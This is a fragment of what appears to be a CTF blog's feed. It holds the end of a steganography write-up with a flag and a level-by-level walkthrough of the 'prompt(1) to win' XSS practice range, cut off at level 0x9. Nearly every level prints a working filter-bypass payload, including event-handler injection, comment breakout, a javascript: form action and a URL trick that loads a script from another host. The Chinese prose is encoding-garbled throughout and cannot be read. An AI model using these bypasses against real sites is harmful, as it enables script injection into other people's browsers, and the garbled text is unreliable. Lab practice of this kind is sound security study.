<code>love.zip</code>ã€‚</p><p>å…ˆè§£ keyï¼Œkey ä¸ºé›¶å®½å­—èŠ‚éšå†™ï¼Œ<a href="http://330k.github.io/misc_tools/unicode_steganography.html">è§£ç ç½‘ç«™</a></p><blockquote><p>Because I like naruto best</p></blockquote><p>è§£å‹å›¾ç‰‡åå‘ç°æœ‰å¤§é‡å›¾ç‰‡ï¼Œä½†æ˜¯ä»…æœ‰ é›ç”° å’Œ é¸£äºº å¤´åƒï¼Œä¸”å›¾ç‰‡æ•°æ®åˆ†åˆ«ç›¸åŒï¼ŒçŒœæµ‹ä¸º 01 äºŒè¿›åˆ¶ï¼Œå†™è„šæœ¬è¾“å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">mark0 = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/0.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">m0 = mark0.size</span><br><span class="line">mark1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/1.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">m1 = mark1.size</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">129488</span>):</span><br><span class="line">    print(<span class="string">f&quot;[+]New is img<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    mark = Image.<span class="built_in">open</span>(<span class="string">f&#x27;./out/<span class="subst">&#123;i&#125;</span>.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> mark.size == m0:</span><br><span class="line">        result += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„äºŒè¿›åˆ¶é€æ­¥è§£ç åå³å¯å¾—åˆ°å›¾ç‰‡</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821160253239.png"></p><p>flag</p><blockquote><p>flag{57dd74fb21bb1aee50f19421bf836f23}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;ezyii&quot;&gt;&lt;a href=&quot;#ezyii&quot; class=&quot;headerlink&quot; title=&quot;ezyii&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>prompt(1) to win - XSSé¶åœºç»ƒä¹ </title>
    <link href="https://lucifer-rossweisse.github.io/2021/08/17/web%E5%AD%A6%E4%B9%A0/prompt-1-to-win/"/>
    <id>https://lucifer-rossweisse.github.io/2021/08/17/web%E5%AD%A6%E4%B9%A0/prompt-1-to-win/</id>
    <published>2021-08-17T13:51:38.000Z</published>
    <updated>2021-08-17T14:03:13.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="prompt-1-to-win-XSSé¶åœºç»ƒä¹ "><a href="#prompt-1-to-win-XSSé¶åœºç»ƒä¹ " class="headerlink" title="prompt(1) to win - XSSé¶åœºç»ƒä¹ "></a>prompt(1) to win - XSSé¶åœºç»ƒä¹ </h1><p>æ¥è§¦çš„æ¯”èµ›è¶Šå¤šè¶Šå‘è§‰è‡ªå·±çš„å®åŠ›è¿˜æ˜¯å¤ªå¼±äº†ï¼Œè¿˜æ˜¯è¦åŠªåŠ›å˜å¼ºã€‚</p><p>ä¸€ç›´å¯¹XSSçš„ç†è§£å¾ˆæ¨¡ç³Šï¼Œä¸»è¦è¿˜æ˜¯æ²¡åšè¿‡å¤šå°‘è¿™ç±»çš„ç±»å‹é¢˜ï¼Œåœ¨è°­æ€»é‚£æ‰¾åˆ°ä¸ªé¶åœºæ‰“ç®—å¼€å§‹ç»ƒç»ƒã€‚</p><p>å¼€å§‹å¼€å§‹ï¼</p><h2 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h2><p>prompt(1) to winè¿™ä¸ªåœ¨çº¿é¶åœºèƒ½å¤Ÿç›´è§‚çš„æŸ¥çœ‹è‡ªå·±çš„XSSä»£ç è¢«è¿‡æ»¤åçš„ç»“æœï¼Œæ¯”è¾ƒæ–¹ä¾¿ç»ƒä¹ ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814131646681.png"></p><hr><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>ç¬¬ä¸€å…³æ²¡è¿‡æ»¤ä¸œè¥¿ï¼Œåªéœ€è¦é—­åˆä¸€ä¸‹å‰é¢çš„<code>\&quot;</code>å°±è¡Œäº†ã€‚</p><blockquote><p>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814131959530.png"></p><hr><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>å¯¹äºè¿‡æ»¤<code>&lt;</code>å’Œ<code>&gt;</code>ä¸­çš„å†…å®¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;BODY</code>æ ‡ç­¾è¿›è¡Œç»•è¿‡<code>&lt;BODY onload=&quot;prompt(1)&quot;</code></p><blockquote><p>onload äº‹ä»¶åœ¨é¡µé¢è½½å…¥å®Œæˆåç«‹å³è§¦å‘ã€‚</p></blockquote><p>æˆ–è€…ä½¿ç”¨<code>&lt;img</code>æ ‡ç­¾è¿›è¡Œç»•è¿‡<code>&lt;img src=# onerror=&quot;prompt(1)&quot;</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210814132452447.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload&#x3D;&quot;prompt(1)&quot;</span><br><span class="line">      </span><br><span class="line">&lt;img src&#x3D;# onerror&#x3D;&quot;prompt(1)&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>è¿™å…³æŠŠ<code>=</code> å’Œ <code>(</code>banæ‰äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨svgæ ‡ç­¾ç»•è¿‡</p><blockquote><p>SVGå±äºæ”¯æŒXMLè§£æï¼Œæ‰€ä»¥é‚£ä¹ˆæˆ‘ä»¬å°±å¾ˆå¥½ç†è§£äº†ï¼Œå› ä¸ºä¸‹xmlæ”¯æŒåœ¨æ ‡ç­¾å†…è§£æHTMLå®ä½“å­—ç¬¦ï¼Œæ‰€ä»¥åœ¨åœ¨XMLä¸­<code>&amp;#40;</code>ä¼šè¢«è§£ææˆ<code>ï¼ˆ</code></p></blockquote><p><a href="https://tool.oschina.net/encode">ç¼–ç ç½‘ç«™</a></p><p><a href="http://pupiles.com/xss.html">æµ…è°ˆXSSçš„å°æŠ€å·§ä¸æµè§ˆå™¨ç¼–ç </a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">prompt<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³æŠŠè¾“å…¥å£æ”¾åœ¨äº†æ³¨é‡Šæ ‡ç­¾ä¸­ï¼Œä¸”æŠŠæ³¨é‡Šæ ‡ç­¾çš„é—­åˆè¿‡æ»¤äº†ï¼Œæ‰¾æ‰¾å…¶ä»–çš„é—­åˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line">&lt;!-- --!&gt; 2012å¹´åå¯ç”¨</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><hr><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid resource.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³åˆ©ç”¨æ­£åˆ™å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¼€å¤´å¿…é¡»ä¸º<code>http://prompt.ml/</code>ã€‚</p><p>åŸæœ¬ä»¥ä¸ºæ˜¯å¯ä»¥åœ¨ä¸­é—´æ„é€ è¯­å¥é—­åˆè¿›è¡Œç»•è¿‡çš„ï¼Œä½†æ˜¯å‘ç°ä¼šè½¬ä¸ºå®ä½“å­—ç¬¦ï¼Œè¿™æ¡çº¿èµ°ä¸é€šã€‚</p><p>çœ‹äº†çœ‹å¸ˆå‚…ä»¬çš„wpï¼Œæµè§ˆå™¨æ˜¯æ”¯æŒè¿™ç§urlå†™æ³•çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;username:password@attacker.comï¼Œä½†æ˜¯https:&#x2F;&#x2F;username:password&#x2F;@attacker.comä¸è¡Œï¼Œè¿™é‡Œç”±äºç”¨äº†decodeURIComponentï¼Œæ‰€ä»¥å¯ä»¥ç”¨%2fè§£ç ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦ç”¨åˆ°è‡ªå·±çš„æœåŠ¡å™¨ï¼Œç›´æ¥ä¼ ä¸ª<code>prompt(1)</code>çš„jsæ–‡ä»¶ä¸Šå»ï¼Œç„¶åè®¿é—®ã€‚</p><p>tipsï¼šè¿™ç§urlå†™æ³•chromeå¹¶ä¸æ”¯æŒï¼Œç«ç‹è¿˜å¯ä»¥ç”¨ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817131241835.png"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥å¼€phpstudyçš„æœåŠ¡å™¨ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨è‡ªå·±çš„æœåŠ¡å™¨æ‰“ã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@localhost&#x2F;xss.js</span><br></pre></td></tr></table></figure><hr><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter &quot;&gt;&quot; and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³è¿‡æ»¤äº†<code>&gt;</code>ã€<code>onxxxx=</code>ã€<code>focus</code>ï¼Œå¯ä»¥ç”¨<code>&quot;</code>é—­åˆ<code>value</code>ï¼Œç„¶åè‡ªå®šä¹‰<code>type=&quot;image&quot;</code>ï¼Œæœ€ååˆ©ç”¨æ¢è¡Œç¬¦ç»•è¿‡<code>onxxxx=</code></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;image&quot; src&#x3D;# onerror&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; let&#39;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; pass in formURL#formDataJSON</span><br><span class="line">        &#x2F;&#x2F; e.g. http:&#x2F;&#x2F;httpbin.org&#x2F;post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments &#x3D; input.split(&#39;#&#39;);</span><br><span class="line">        var formURL &#x3D; segments[0];</span><br><span class="line">        var formData &#x3D; JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form &#x3D; document.createElement(&#39;form&#39;);</span><br><span class="line">        form.action &#x3D; formURL;</span><br><span class="line">        form.method &#x3D; &#39;post&#39;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input &#x3D; form.appendChild(document.createElement(&#39;input&#39;));</span><br><span class="line">            input.name &#x3D; i;</span><br><span class="line">            input.setAttribute(&#39;value&#39;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &#39;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    &#x2F;&#x2F; forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!&#x2F;script:|data:&#x2F;i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;&#x2F;script&gt;                                                 \n\</span><br><span class="line">        &#39;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &#39;Invalid form data.&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³é€šè¿‡demoå‘ç°æ€»å…±æœ‰<code>action</code>ã€<code>method</code>ã€<code>name</code>å’Œ<code>value</code>æ˜¯å¯æ§çš„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://httpbin.org/post&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Matt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="javascript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;Action forbidden.&quot;</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ifè¯­å¥é€šè¿‡äº†ï¼Œåˆ™ä¼šsubmitæˆ‘ä»¬çš„actionå€¼ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨ <code>javascript:</code> jsä¼ªåè®®è¿›è¡Œjsä»£ç æ‰§è¡Œï¼Œç„¶åå¯ä»¥é€šè¿‡æ§åˆ¶ <code>name</code> çš„å€¼ï¼Œç ´åçª—å£çš„actionå±æ€§ï¼Œè¿›è€Œç»•è¿‡ <code>if</code>ã€‚</p><p>ä¸Šæµ‹è¯•:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:prompt(1)&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817145123855.png"></p><p>å¯ä»¥å‘ç°è¾“å‡ºäº†æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³é™åˆ¶äº†åªèƒ½æœ‰12ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ç”¨jsçš„å¤šè¡Œæ³¨é‡Šæ¥æ³¨é‡Šæ‰å¤šå‡ºæ¥çš„æ ‡ç­¾ã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt(1&#x2F;*#*&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;&quot;&gt;&lt;script&gt;&#x2F;*&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;*&#x2F;prompt(1&#x2F;*&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;*&#x2F;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>tipsï¼šæ³¨é‡Šç¬¦ä¹Ÿç®—åœ¨é•¿åº¦ä¸­ã€‚</p><hr><h2 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/&quot;]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log(&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;);        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ç»•å•è¡Œæ³¨é‡Šï¼Œå¯ä»¥æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯ban æ‰äº†ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œè¿™é‡Œå¯ä»¥ç”¨åˆ° unicode ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œç„¶åç”¨ js çš„æ³¨é‡Š <code>-&gt;</code>æ³¨é‡Šæ‰åé¢çš„ <code>&quot;);</code></p><blockquote><p>\u2028ï¼ŒUnicodeè¡Œåˆ†éš”ç¬¦</p><p>\u2029ï¼ŒUnicodeæ®µè½åˆ†éš”ç¬¦</p></blockquote><p>è¿™é¢˜å¥½åƒæœ‰å‘ï¼Œæ— æ³•å¤ç°ï¼Œè¿‡ï¼</p><hr><h2 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>toUpperCase()</code>å­˜åœ¨æ¼æ´ï¼Œä¸ä»…ä¼šè½¬æ¢è‹±æ–‡å­—æ¯ï¼Œä¹Ÿä¼šè½¬æ¢ä¸€äº› <code>Unicode</code> å­—ç¬¦ï¼Œæ¯”å¦‚ <code>Å¿</code> ä¼ 